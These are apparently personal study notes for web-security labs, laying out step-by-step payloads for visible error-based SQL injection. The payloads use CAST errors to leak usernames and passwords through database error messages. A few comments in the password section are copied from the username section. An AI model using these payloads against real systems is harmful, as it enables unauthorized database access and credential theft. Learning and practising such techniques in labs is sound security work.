
## Visible Error Based SQLi

- Visible Error Based SQLi is basically when you inject a payload and that causes the database to raise an error and return the error message.
- We need to trigger visible errors so that we can inject our custom payloads and trigger database error and get useful information returned to us through the error message.


### 1. Checking Parameter Vulnerability

```sql
'
'--

/*
If one payload causes error and another doesn't it means that parameter is vulnerable to sqli. You need to find which parameter is vulnerable first.
you need to have a basic idea of what the original query is.
*/
```

### 2. Testing Error Entries 

```sql
' AND CAST((SELECT 1) AS int)--
/*
the first payload is for error testing.
this doesnt have a proper boolean expression so it will most likely fail.
But the database will print the error message.
*/
 
' AND 1=CAST((SELECT 1) AS int)--
/*
the second payload fixes the boolean expression so
it will most likely not throw an error. This is for testing the visible error sqli.
if this payload works the further payloads are going to build up on this one.
*/
```

### 3. Checking Usernames

```sql
' AND 1=CAST((SELECT <username column> FROM <table_name>) AS int)--

/*
After sending the payload, carefully examine the error message returned by the server. If the SQL query shown in the error does not include your entire payload, and certain parts of your injection (such as closing brackets, `int`, or the comment `--`) are missing, this indicates that the payload was truncated before reaching the database. 
To resolve this, you should reduce the length of your payload by removing unnecessary parts (such as the original TrackingId value) and keeping only the essential injection logic.
Now this payload might return multiple rows which will cause error so use the below payload to fix this.
*/

' AND 1=CAST((SELECT <username column> FROM <table_name> LIMIT 1) AS int)--


/*
there is another way to check username as well
the below payload does exactly that but
if length of the request matters we cannot use the below payload.
*/

' AND 1=CAST((SELECT <username column> FROM <table_name> WHERE <username column>='<username>') AS int)--
```

### 4. Finding Password

```sql
' AND 1=CAST((SELECT <password column> FROM <table_name> LIMIT 1) AS int)--

/*
After sending the payload, carefully examine the error message returned by the server. If the SQL query shown in the error does not include your entire payload, and certain parts of your injection (such as closing brackets, `int`, or the comment `--`) are missing, this indicates that the payload was truncated before reaching the database. 
To resolve this, you should reduce the length of your payload by removing unnecessary parts (such as the original TrackingId value) and keeping only the essential injection logic.
Now this payload might return multiple rows which will cause error so use the below payload to fix this.
*/

/*
there is another way to check username as well
the below payload does exactly that but
if length of the request matters we cannot use the below payload.
*/

' AND 1=CAST((SELECT <password column> FROM <table_name> WHERE <username column>='<username>') AS int)--
```

---
## Examining the Database

[SQLi CHEATSHEET PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)